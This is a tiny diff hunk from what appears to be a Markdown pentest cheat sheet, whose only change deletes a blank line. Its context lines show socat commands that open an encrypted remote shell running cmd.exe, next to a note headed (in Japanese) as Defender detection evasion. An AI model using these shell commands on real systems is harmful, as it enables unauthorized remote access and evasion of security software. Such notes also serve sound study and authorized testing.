@@ -527,7 +527,6 @@ socat OPENSSL-LISTEN:<Port>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
 socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
 ```
 
-
 > [!Tip] Defender検知回避
 > Contents
 
